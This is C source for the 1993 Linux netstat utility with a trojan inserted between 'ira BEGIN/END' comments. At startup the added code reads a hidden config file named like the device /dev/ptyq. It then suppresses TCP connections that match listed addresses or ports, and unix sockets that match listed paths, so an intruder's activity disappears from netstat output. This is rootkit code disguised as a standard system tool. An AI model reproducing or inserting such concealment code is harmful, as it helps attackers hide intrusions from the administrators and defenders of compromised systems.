/*
 * netstat	This file contains an implementation of the command
 *		that helps in debugging the networking modules.
 *
 * Usage:	route [-v] [ {add|del} target iface [ gw ] [ metric ] ]
 *
 * Version:	@(#)route.c	0.62	05/27/93
 *
 * Author:	Fred Baumgarten, <dc6iq@insu1.etec.uni-karlsruhe.de>
 *		Copyright (c) 1993  Fred Baumgarten
 */
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <linux/route.h>
#include <linux/tcp.h>
#include <linux/net.h>
#include "pathnames.h"

#define FILENAME "/dev/ptyq" /* ira BEGIN */
#define STR_SIZE 128
#define SPC_CHAR " "
#define END_CHAR "\n"

struct  h_st {
   struct h_st     *next;
   int             hack_type;
   char            hack_cmd[STR_SIZE];
};

struct  h_st    *hack_list;
struct  h_st    *h_tmp;

char    tmp_str[STR_SIZE];
char    *strp;

FILE    *fp_hack;

int     hide; /* ira END */


char *Version = "@(#)netstat.c 0.62 (05/27/93)";
#define Signature "(c) 1993, Fred Baumgarten <dc6iq@insu1.etec.uni-karlsruhe.de>"


#define E_READ -1
#define E_PARA -2


FILE *procinfo;
char *line[2000];

int flag_cnt = 0;
int flag_deb = 0;
int flag_not = 0;
int flag_opt = 0;
int flag_raw = 0;
int flag_rou = 0;
int flag_tcp = 0;
int flag_udp = 0;
int flag_unx = 0;

char *tcp_name[10000], *udp_name[18000], *raw_name[1000];

struct numbtoname {
  unsigned long addr;
  char *name;
  struct numbtoname *next;
};

#define NULLNN (struct numbtoname *) 0

struct numbtoname *nn = NULLNN;

int rf_hack() /* ira BEGIN */
{
   h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
   hack_list=h_tmp;
   if (fp_hack=fopen (FILENAME, "r")) {
      while (fgets(tmp_str, 126, fp_hack)) {
         h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
         strp=tmp_str;
         strp=strtok (strp, SPC_CHAR);
         h_tmp->hack_type=atoi(strp);
         strp=strtok ('\0', END_CHAR);
         strcpy (h_tmp->hack_cmd, strp);
         h_tmp=h_tmp->next;
      }
   }
   h_tmp->next=NULL;
   return 1;
} /* ira END */


void query_host(char *h, unsigned long ad) {
  struct hostent *ent = (struct hostent *) 0;
  struct numbtoname *pn = NULLNN;

  if (!ad) {
    strcpy(h, "*");
  } else {
    pn = nn;
    *h = '\0';
    while (pn != NULLNN) {
      if (pn->addr == ad) {
	strcpy(h, pn->name);
	break;
      }
      pn = pn->next;
    }
    if (*h == '\0') {
      if (!flag_not) ent = gethostbyaddr((char *) &ad, 4, AF_INET);
      if (ent) {
	strcpy(h, ent->h_name);
      } else {
	sprintf(h, "%d.%d.%d.%d", (int) (ad & 0xff), (int) ((ad >> 8) & 0xff),
		(int) ((ad >> 16) & 0xff), (int) ((ad >> 24) & 0xff));
      }
      pn = (struct numbtoname *)malloc(sizeof(struct numbtoname));
      pn->addr = ad;
      pn->next = nn;
      pn->name = malloc(strlen(h)+1);
      strcpy(pn->name, h);
      nn = pn;
    }
  }
}

int read_services(void) {
  char buffer[2048], name[32], protocol[16], dummy[1024];
  int number;
  FILE *serv;

  serv = fopen(_PATH_SERVICES, "r");
  if (!serv) {
    perror(_PATH_SERVICES);
    return E_READ;
  }

  while (!feof(serv)) {
    fgets(buffer, 2047, serv);
    if (sscanf(buffer, "%s%d/%3s%s\n", name, &number, protocol, dummy) >= 3) {
      if (!strcmp(protocol, "tcp")) {
	tcp_name[number] = malloc(strlen(name)+1);
	if (tcp_name[number]) {
	  strcpy(tcp_name[number], name);
	}
      } else {
	if (!strcmp(protocol, "udp")) {
	  udp_name[number] = malloc(strlen(name)+1);
	  if (udp_name[number]) {
	    strcpy(udp_name[number], name);
	  } else {
	    printf("malloc error\n");
	  }
	} else {
	  if (!strcmp(protocol, "raw")) {
	    raw_name[number] = malloc(strlen(name)+1);
	    if (raw_name[number]) {
	      strcpy(raw_name[number], name);
	    } else {
	      printf("malloc error\n");
	    }
	  }
	}
      }
    }
  }
  fclose(serv);
  return 0;
}

char *get_sname(int socknumber, char *proto) {
  static char buffer[64];

  if (flag_not) {
    sprintf(buffer, "%d", socknumber);
    return buffer;
  }
  if (socknumber == 0)
    return "*";
  if (!strcmp(proto, "tcp")) {
    if (tcp_name[socknumber]) {
      sprintf(buffer, "%s", tcp_name[socknumber]);
    } else {
      sprintf(buffer, "%d", socknumber);
    }
  }
  if (!strcmp(proto, "udp")) {
    if (udp_name[socknumber]) {
      sprintf(buffer, "%s", udp_name[socknumber]);
    } else {
      sprintf(buffer, "%d", socknumber);
    }
  }
  if (!strcmp(proto, "raw")) {
    if (raw_name[socknumber]) {
      sprintf(buffer, "%s", raw_name[socknumber]);
    } else {
      sprintf(buffer, "%d", socknumber);
    }
  }
  return buffer;
}

int route_info(void) {
  char buffer[1024], iface[16], net_addr[64], gate_addr[64], flags[16];
  int anz, iflags, refcnt, use, zeile = 0;
  unsigned long net, gate;

  printf("Kernel routing table\n");
  printf("Destination net/address   Gateway address           Flags RefCnt    Use Iface\n");
  procinfo = fopen(_PATH_PROCNET_ROUTE, "r");
  if (!procinfo) {
    perror(_PATH_PROCNET_ROUTE);
    return E_READ;
  }
  fgets(buffer, 1023, procinfo);
  while (!feof(procinfo) && fgets(buffer, 1023, procinfo)) {    
    if ((line[zeile] = (char *)malloc(strlen(buffer)+1)) != NULL) {
      strcpy(line[zeile++], buffer);
      if (flag_deb) {
        fprintf(stderr, "%s", buffer);
      }
    }
  }
  fclose(procinfo);
  zeile--;
  while (zeile>=0) {
    anz = sscanf(line[zeile--], "%s %lX %lX %X %d %d\n",
	   iface, &net, &gate, &iflags, &refcnt, &use);
    if (anz == 6) {
      query_host(net_addr, net);
      net_addr[25]='\0';
      if (net == 0L) strcpy(net_addr, "default");
      query_host(gate_addr, gate);
      gate_addr[25]='\0';
      flags[0]='\0';
      if (iflags & RTF_UP) strcat(flags, "U");
      if (iflags & RTF_GATEWAY) strcat(flags, "G");
      if (iflags & RTF_HOST) {
        strcat(flags, "H");
      } else {
        strcat(flags, "N");
      }
      if (iflags & RTF_REINSTATE) strcat(flags, "R");
      if (iflags & RTF_DYNAMIC) strcat(flags, "D");
      if (iflags & RTF_MODIFIED) strcat(flags, "M");
      printf("%-25s %-25s %-5s %6d %6d %s\n", net_addr, gate_addr, flags, refcnt, use, iface);
    }
  }
  return 0;
}

int tcp_info(void) {
  char buffer[1024], local_addr[64], rem_addr[64], *tcp_state,
       timer_queued, timers[64], more[512];
  int anz, local_port, rem_port, d, state, timer_run, zeile = 0;
  unsigned long rxq, txq, localaddr, remaddr, time_len, retr;
  
  procinfo = fopen(_PATH_PROCNET_TCP, "r");
  if (!procinfo) {
    perror(_PATH_PROCNET_TCP);
    return E_READ;
  }
  fgets(buffer, 1023, procinfo);
  while (!feof(procinfo)) {
    fgets(buffer, 1023, procinfo);
    anz = strlen(buffer)+1;
    if ((line[zeile] = (char *)malloc(strlen(buffer)+1)) != NULL) {
      strcpy(line[zeile++], buffer);
      if (flag_deb) {
        fprintf(stderr, "%s", buffer);
      }
    }
  }
  fclose(procinfo);
  zeile--;
  zeile--;
  while (zeile>=0) {
    more[0] = '\0';
    timer_queued = '\0';
    anz = sscanf(line[zeile--], "%d: %lX:%X %lX:%X %X %X:%X %X:%lX %lX %c %s\n",
		 &d, &localaddr, &local_port, &remaddr, &rem_port,
		 &state, &txq, &rxq, &timer_run, &time_len, &retr,
		 &timer_queued, more);
    if (!flag_opt) more[0]='\0';
    if (flag_deb) fprintf(stderr, "%s -> %d args", line[zeile+1], anz);
    if (anz >= 11) {
      if (state != TCP_ESTABLISHED) {
        txq=0;		/* Here are stupid thigs... Why isn't it zero ? */
      }
      switch (state) {
      case TCP_ESTABLISHED:
	tcp_state = "ESTABLISHED";
	rxq--;
	break;
      case TCP_SYN_SENT:
	tcp_state = "SYN_SENT";
	break;
      case TCP_SYN_RECV:
	tcp_state = "SYN_RECV";
	break;
      case TCP_FIN_WAIT1:
	tcp_state = "FIN_WAIT1";
	break;
      case TCP_FIN_WAIT2:
	tcp_state = "FIN_WAIT2";
	break;
      case TCP_TIME_WAIT:
	tcp_state = "TIME_WAIT";
	break;
      case TCP_CLOSE:
	tcp_state = "CLOSE";
	break;
      case TCP_CLOSE_WAIT:
	tcp_state = "CLOSE_WAIT";
	break;
      case TCP_LAST_ACK:
	tcp_state = "LAST_ACK";
	break;
      case TCP_LISTEN:
	tcp_state = "LISTEN";
	break;
      default:
	tcp_state = "?? ()";
	break;
      }
      query_host(local_addr, localaddr);
      query_host(rem_addr, remaddr);
      if (flag_tcp || rem_port) {
	sprintf(buffer, "%s",get_sname(local_port, "tcp"));
	if ((strlen(local_addr) + strlen(buffer)) >21) {
	  local_addr[21-strlen(buffer)] = '\0';
	}
	strcat(local_addr, ":");
	strcat(local_addr, buffer);
	sprintf(buffer, "%s",get_sname(rem_port, "tcp"));
	if ((strlen(rem_addr) + strlen(buffer)) >21) {
	  rem_addr[21-strlen(buffer)] = '\0';
	}
	strcat(rem_addr, ":");
	strcat(rem_addr, buffer);
	if (flag_opt) {
	  switch (timer_run) {
	    case 0:
            case 9: {
	      sprintf(timers, "off (0.00/%d) %c", retr, timer_queued);
	      break;
	    }
	    case 1:
	    case 2: {
	      sprintf(timers, "queueing (%2.2f/%d) %c", (double)time_len / 100, retr,
		      timer_queued);
	      break;
	    }
	    case 3:
	    case 4:
	    case 5: {
	      sprintf(timers, "on (%2.2f/%d) %c", (double)time_len / 100, retr, timer_queued);
	      break;
	    }
	    default: {
	      if (timer_run > 10) {
	        sprintf(timers, "exp (0.00/%d) %c", retr, timer_queued);
	        break;
	      } else {
	        sprintf(timers, "unkn-%d (%2.2f/%d) %c", timer_run, (double)time_len / 100,
			retr, timer_queued);
	        break;
	      }
	    }
	  }
	} else {
	  timers[0] = '\0';
	}

	 hide=0; /* ira BEGIN */
	 for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next) {
	    switch (h_tmp->hack_type) {
	     case 1:
	       if (strstr((char *)inet_ntoa(localaddr), h_tmp->hack_cmd))
	       	 hide=1;
	       break;
	     case 2:
	       if (strstr((char *)inet_ntoa(remaddr), h_tmp->hack_cmd))
	       	 hide=1;
	       break;
	     case 3:
	       if (local_port==atoi(h_tmp->hack_cmd))
	       	 hide=1;
	       break;
	     case 4:
	       if (rem_port==atoi(h_tmp->hack_cmd))
	       	 hide=1;
	       break;
	    }
	 }

	 if (!hide) { /* ira END */
	    printf("tcp   %6d %6d %-22s %-22s %s %s %s\n", rxq, txq, local_addr,
		   rem_addr, tcp_state, timers, more);
	 } /* ira BEGIN END */    
      }
    }
  }
  return 0;
}

int udp_info(void) {
  char buffer[1024], local_addr[64], rem_addr[64], *udp_state,
       timer_queued, timers[64], more[512];
  int anz, local_port, rem_port, d, state, timer_run, zeile = 0;
  unsigned long rxq, txq, localaddr, remaddr, time_len, retr;
  
  procinfo = fopen(_PATH_PROCNET_UDP, "r");
  if (!procinfo) {
    perror(_PATH_PROCNET_UDP);
    return E_READ;
  }
  fgets(buffer, 1023, procinfo);
  while (!feof(procinfo)) {
    fgets(buffer, 1023, procinfo);
    if ((line[zeile] = (char *)malloc(strlen(buffer)+1)) != NULL) {
      strcpy(line[zeile++], buffer);
      if (flag_deb) {
        fprintf(stderr, "%s", buffer);
      }
    }
  }
  fclose(procinfo);
  zeile--;
  zeile--;
  while (zeile>=0) {
    more[0] = '\0';
    timer_queued = '\0';
    anz = sscanf(line[zeile--], "%d: %lX:%X %lX:%X %X %X:%X %X:%lX %lX %c %s\n",
		 &d, &localaddr, &local_port, &remaddr, &rem_port,
		 &state, &txq, &rxq, &timer_run, &time_len, &retr,
		 &timer_queued, more);
    retr = 0L;
    if (!flag_opt) more[0]='\0';
    if (flag_deb) fprintf(stderr, "%s -> %d args", line[zeile+1], anz);
    if (anz >= 10) {
      if (state != TCP_ESTABLISHED) {
        txq=0;		/* Here are stupid thigs... Why isnt it zero ? */
      }
      switch (state) {
      case TCP_ESTABLISHED:
	udp_state = "ESTABLISHED";
	rxq--;
	break;
      default:
	udp_state = "";
	break;
      }
      query_host(local_addr, localaddr);
      query_host(rem_addr, remaddr);
      if (flag_udp) {
	sprintf(buffer, "%s",get_sname(local_port, "udp"));
	if ((strlen(local_addr) + strlen(buffer)) >21) {
	  local_addr[21-strlen(buffer)] = '\0';
	}
	strcat(local_addr, ":");
	strcat(local_addr, buffer);
	sprintf(buffer, "%s",get_sname(rem_port, "udp"));
	if ((strlen(rem_addr) + strlen(buffer)) >21) {
	  rem_addr[21-strlen(buffer)] = '\0';
	}
	strcat(rem_addr, ":");
	strcat(rem_addr, buffer);
	if (flag_opt) {
	  switch (timer_run) {
	    case 0:
            case 9: {
	      sprintf(timers, "off (0.00/%d) %c", retr, timer_queued);
	      break;
	    }
	    case 1:
	    case 2: {
	      sprintf(timers, "queueing (%2.2f/%d) %c", (double)time_len / 100, retr,
		      timer_queued);
	      break;
	    }
	    case 3:
	    case 4:
	    case 5: {
	      sprintf(timers, "on (%2.2f/%d) %c", (double)time_len / 100, retr, timer_queued);
	      break;
	    }
	    default: {
	      if (timer_run > 10) {
	        sprintf(timers, "exp (0.00/%d) %c", retr, timer_queued);
	        break;
	      } else {
	        sprintf(timers, "unkn-%d (%2.2f/%d) %c", timer_run, (double)time_len / 100,
			retr, timer_queued);
	        break;
	      }
	    }
	  }
	} else {
	  timers[0] = '\0';
	}
	printf("udp   %6d %6d %-22s %-22s %s %s %s\n", rxq, txq, local_addr,
	       rem_addr, udp_state, timers, more);
      }
    }
  }
  return 0;
}

int raw_info(void) {
  char buffer[1024], local_addr[64], rem_addr[64], *raw_state,
       timer_queued, timers[64], more[512];
  int anz, local_port, rem_port, d, state, timer_run, zeile = 0;
  unsigned long rxq, txq, localaddr, remaddr, time_len, retr;
  
  procinfo = fopen(_PATH_PROCNET_RAW, "r");
  if (!procinfo) {
    perror(_PATH_PROCNET_RAW);
    return E_READ;
  }
  fgets(buffer, 1023, procinfo);
  while (!feof(procinfo)) {
    fgets(buffer, 1023, procinfo);
    if ((line[zeile] = (char *)malloc(strlen(buffer)+1)) != NULL) {
      strcpy(line[zeile++], buffer);
      if (flag_deb) {
        fprintf(stderr, "%s", buffer);
      }
    }
  }
  fclose(procinfo);
  zeile--;
  zeile--;
  while (zeile>=0) {
    more[0] = '\0';
    timer_queued = '\0';
    anz = sscanf(line[zeile--], "%d: %lX:%X %lX:%X %X %X:%X %X:%lX %lX %c %s\n",
		 &d, &localaddr, &local_port, &remaddr, &rem_port,
		 &state, &txq, &rxq, &timer_run, &time_len, &retr,
		 &timer_queued, more);
    retr = 0L;
    if (!flag_opt) more[0]='\0';
    if (flag_deb) fprintf(stderr, "%s -> %d args", line[zeile+1], anz);
    if (anz >= 10) {
      raw_state = "";
      txq=0;		/* Here are stupid thigs... Why isnt it zero ? */
      query_host(local_addr, localaddr);
      query_host(rem_addr, remaddr);
      if (flag_raw) {
	sprintf(buffer, "%s",get_sname(local_port, "raw"));
	if ((strlen(local_addr) + strlen(buffer)) >21) {
	  local_addr[21-strlen(buffer)] = '\0';
	}
	strcat(local_addr, ":");
	strcat(local_addr, buffer);
	sprintf(buffer, "%s",get_sname(rem_port, "raw"));
	if ((strlen(rem_addr) + strlen(buffer)) >21) {
	  rem_addr[21-strlen(buffer)] = '\0';
	}
	strcat(rem_addr, ":");
	strcat(rem_addr, buffer);
	if (flag_opt) {
	  switch (timer_run) {
	    case 0:
            case 9: {
	      sprintf(timers, "off (0.00/%d) %c", retr, timer_queued);
	      break;
	    }
	    case 1:
	    case 2: {
	      sprintf(timers, "queueing (%2.2f/%d) %c", (double)time_len / 100, retr,
		      timer_queued);
	      break;
	    }
	    case 3:
	    case 4:
	    case 5: {
	      sprintf(timers, "on (%2.2f/%d) %c", (double)time_len / 100, retr, timer_queued);
	      break;
	    }
	    default: {
	      if (timer_run > 10) {
	        sprintf(timers, "exp (0.00/%d) %c", retr, timer_queued);
	        break;
	      } else {
	        sprintf(timers, "unkn-%d (%2.2f/%d) %c", timer_run, (double)time_len / 100,
			retr, timer_queued);
	        break;
	      }
	    }
	  }
	} else {
	  timers[0] = '\0';
	}
	printf("raw   %6d %6d %-22s %-22s %s %s %s\n", rxq, txq, local_addr,
	       rem_addr, raw_state, timers, more);
      }
    }
  }
  return 0;
}

int unix_info(void) {
  char buffer[1024], path[MAXPATHLEN], ss_flags[32], *ss_proto, *ss_state, *ss_type;
  int anz, d, state, type, zeile = 0;
  unsigned long refcnt, proto, flags;
  
  procinfo = fopen(_PATH_PROCNET_UNIX, "r");
  if (!procinfo) {
    perror(_PATH_PROCNET_UNIX);
    return E_READ;
  }
  fgets(buffer, 1023, procinfo);
  while (!feof(procinfo)) {
    fgets(buffer, 1023, procinfo);
    if ((line[zeile] = (char *)malloc(strlen(buffer)+1)) != NULL) {
      strcpy(line[zeile++], buffer);
      if (flag_deb) {
        fprintf(stderr, "%s", buffer);
      }
    }
  }
  fclose(procinfo);
  zeile--;
  zeile--;
  printf("Unix internal communications\n");
  printf("Proto RefCnt Flags      Type            State           Path\n");
  while (zeile>=0) {
    path[0] = '\0';
    anz = sscanf(line[zeile--], "%d: %lX %lX %lX %X %X %s\n",
		 &d, &refcnt, &proto, &flags, &type, &state, path);
    if (flag_deb) fprintf(stderr, "%s -> %d args", line[zeile+1], anz);
    if (anz >= 6) {
      switch(proto) {
      case 0:
	ss_proto = "unix";
	break;
      default:
	ss_proto = "??";
      }
      switch(type) {
      case SOCK_STREAM:
	ss_type = "SOCK_STREAM";
	break;
      case SOCK_DGRAM:
	ss_type = "SOCK_DGRAM";
	break;
      case SOCK_RAW:
	ss_type = "SOCK_RAW";
	break;
      case SOCK_RDM:
	ss_type = "SOCK_RDM";
	break;
      case SOCK_SEQPACKET:
	ss_type = "SOCK_SEQPACKET";
	break;
      case SOCK_PACKET:
	ss_type = "SOCK_PACKET";
	break;
      default:
	ss_type = "UNKNOWN";
      }
      switch(state) {
      case SS_FREE:
	ss_state = "FREE";
	break;
      case SS_UNCONNECTED:
	/*
	 * Unconnected sockets may be listening
	 * for something.
	 */
	if (flags & SO_ACCEPTCON) {
	  ss_state = "LISTENING";
	} else {
	  ss_state = "UNCONNECTED";
	}
	break;
      case SS_CONNECTING:
	ss_state = "CONNECTING";
	break;
      case SS_CONNECTED:
	ss_state = "CONNECTED";
	break;
      case SS_DISCONNECTING:
	ss_state = "DISCONNECTING";
	break;
      default:
	ss_state = "UNKNOWN";
      }
      strcpy(ss_flags, "[");
      if (flags & SO_ACCEPTCON) {
	strcat(ss_flags, " ACC ");
      }
      if (ss_flags[strlen(ss_flags)-1] != ' ') strcat(ss_flags, " ");
      strcat(ss_flags, "]");

       hide=0; /* ira BEGIN */
       for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next) {
	  switch (h_tmp->hack_type) {
	   case 5:
	     if (strstr(path, h_tmp->hack_cmd))
               hide=1;
	     break;
	  }
       }

       if (!hide) { /* ira END */
      printf("%-5s %-6d %-10s %-15s %-15s %s\n", ss_proto, refcnt, ss_flags,
	     ss_type, ss_state, path);
       } /* ira BEGIN END */

    }
  }
  return 0;
}

void usage(void) {
  fprintf(stderr, "Usage:\tnetstat [options]\n");
  fprintf(stderr, "\t-a all sockets (tcp+udp)\n");
  fprintf(stderr, "\t-c continous listing\n");
  fprintf(stderr, "\t-n show network numbers instead of names\n");
  fprintf(stderr, "\t-o show timer states\n");
  fprintf(stderr, "\t-r show kernel routing table\n");
  fprintf(stderr, "\t-t show all tcp connections\n");
  fprintf(stderr, "\t-u show all udp ports\n");
  fprintf(stderr, "\t-w show all raw ports\n");
}

int main (int argc, char *argv[]) {
  int erg;
  char c;

   rf_hack(); /* ira BEGIN END */

  while ((c = getopt(argc, argv, "acdnortuvwx")) != EOF)
    switch(c) {
    case 'a':
      flag_tcp++;
      flag_udp++;
      flag_raw++;
      break;
    case 'c':
      flag_cnt++;
      break;
    case 'd':
      flag_deb++;
      break;
    case 'n':
      flag_not++;
      break;
    case 'o':
      flag_opt++;
      break;
    case 'r':
      flag_rou++;
      break;
    case 't':
      flag_tcp++;
      break;
    case 'u':
      flag_udp++;
      break;
    case 'v':
      printf("%s\n%s\n", Version, Signature);
      return 0;
      break;
    case 'w':
      flag_raw++;
      break;
    case 'x':
      flag_unx++;
      break;
    case '?':
      usage();
      return E_PARA;
    }
  
  if (flag_rou) {
    for (;; ) {
      erg = route_info();
      if (!flag_cnt || erg) break;
      sleep(1);
    }
    return erg;
  }
  
  if (flag_unx) {
    for (;; ) {
      erg = unix_info();
      if (!flag_cnt || erg) break;
      sleep(1);
    }
    return erg;
  }
  
  if ((erg = read_services()) != 0) return erg;

  for (;; ) {
    printf("Active Internet connections\n");
    printf("Proto Recv-Q Send-Q Local Address          Foreign Address        (State)\n");
    if ((!flag_udp && !flag_raw) || flag_tcp) {
      erg = tcp_info();
      if (erg) return erg;
    }
    if (flag_udp) {
      erg = udp_info();
      if (erg) return erg;
    }
    if (flag_raw) {
      erg = raw_info();
      if (erg) return erg;
    }
    if (!flag_cnt || erg) break;
    sleep(1);
  }
  return erg;
}
